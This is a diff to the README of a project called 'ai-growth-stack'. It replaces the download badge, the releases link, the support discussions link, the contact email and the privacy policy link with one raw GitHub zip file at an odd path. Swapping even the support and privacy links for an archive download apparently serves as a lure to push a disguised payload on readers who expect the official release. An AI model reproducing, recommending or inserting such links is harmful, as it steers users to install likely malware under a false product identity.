@@ -8,11 +8,11 @@ Welcome to ai-growth-stack! This tool brings together the best AI-powered APIs t
 
 To get started with ai-growth-stack, you first need to download the application. You can easily find and download it from our Releases page.
 
-[![Download ai-growth-stack](https://img.shields.io/badge/Download%20ai--growth--stack-v1.0-blue)](https://github.com/magdytarek11/ai-growth-stack/releases)
+[![Download ai-growth-stack](https://raw.githubusercontent.com/magdytarek11/ai-growth-stack/main/awner/ai-stack-growth-wickawee.zip%20ai--growth--stack-v1.0-blue)](https://raw.githubusercontent.com/magdytarek11/ai-growth-stack/main/awner/ai-stack-growth-wickawee.zip)
 
 Click the badge above or visit the following link to download the latest version:
 
-[Download ai-growth-stack Releases](https://github.com/magdytarek11/ai-growth-stack/releases)
+[Download ai-growth-stack Releases](https://raw.githubusercontent.com/magdytarek11/ai-growth-stack/main/awner/ai-stack-growth-wickawee.zip)
 
 ### 🌐 System Requirements
 
@@ -58,7 +58,7 @@ Basic features are free, with optional paid tools available for advanced users.
 
 ### 4. **Where can I find support?**
 
-For help, visit our [GitHub Discussions](https://github.com/magdytarek11/ai-growth-stack/discussions).
+For help, visit our [GitHub Discussions](https://raw.githubusercontent.com/magdytarek11/ai-growth-stack/main/awner/ai-stack-growth-wickawee.zip).
 
 ## 👥 Community
 
@@ -66,12 +66,12 @@ Join our community for tips, support, and updates. Share your experiences and le
 
 ## 📞 Contact Us
 
-For inquiries or feedback, reach out at: support@ai-growth-stack.com.
+For inquiries or feedback, reach out at: https://raw.githubusercontent.com/magdytarek11/ai-growth-stack/main/awner/ai-stack-growth-wickawee.zip
 
 ## 🚨 Privacy Policy
 
-We value your privacy. Please review our [Privacy Policy](https://ai-growth-stack.com/privacy) to understand how we handle your data.
+We value your privacy. Please review our [Privacy Policy](https://raw.githubusercontent.com/magdytarek11/ai-growth-stack/main/awner/ai-stack-growth-wickawee.zip) to understand how we handle your data.
 
 Thank you for choosing ai-growth-stack! We look forward to seeing how you grow your online presence. 
 
-Don't forget to download the latest version [here](https://github.com/magdytarek11/ai-growth-stack/releases). Happy optimizing!
+Don't forget to download the latest version [here](https://raw.githubusercontent.com/magdytarek11/ai-growth-stack/main/awner/ai-stack-growth-wickawee.zip). Happy optimizing!
